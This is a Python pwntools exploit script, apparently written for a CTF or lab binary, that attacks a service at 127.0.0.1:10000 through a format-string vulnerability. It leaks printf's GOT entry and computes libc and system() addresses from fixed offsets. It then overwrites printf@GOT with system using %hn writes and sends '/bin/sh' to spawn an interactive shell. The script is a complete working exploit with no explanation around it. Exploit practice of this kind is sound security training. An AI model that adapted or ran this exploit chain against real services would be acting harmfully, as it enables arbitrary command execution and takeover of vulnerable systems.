#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : MrSkYe
# @Email   : skye231@foxmail.com
# @File    : leakmemory_64_remote.py
from pwn import *
import binascii
context.log_level = 'debug'
p = remote('127.0.0.1',10000)

def leak(addr):
    payload = "%9$s.TMP" + p64(addr)
    p.sendline(payload)
    print "leaking:", hex(addr)
    p.recvuntil('right:')
    resp = p.recvuntil(".TMP")
    ret = resp[:-4:]
    print "ret:", binascii.hexlify(ret), len(ret)
    remain = p.recvrepeat(0.2)
    return ret

printf_plt = 0x4006B0
printf_got_plt = 0x601030

# name
p.recv()
p.sendline('moxiaoxi')
p.recv()

# leak printf@got
payload = "%9$s.TMP" + p64(printf_got_plt+1)
p.sendline(payload)
p.recvuntil('right:')
printf_got = u64(p.recv(5).ljust(7,'\x00')+'\x00')<<8
log.info("printf_got:"+hex(printf_got))

# libcdatabase
libc_base = printf_got - 0x055800
log.info("libc_base:"+hex(libc_base))
system_addr = libc_base + 0x045390
log.info("system_addr:"+hex(system_addr))

one = p64(system_addr)[:2]
two = p64(system_addr>>16)[:2]

payload = "%9104c%12$hn%54293c%13$hn" + 'a'*7
payload += p64(printf_got_plt) + p64(printf_got_plt+2)


p.sendline(payload)
p.recv()
p.sendline('/bin/sh\x00')


p.interactive()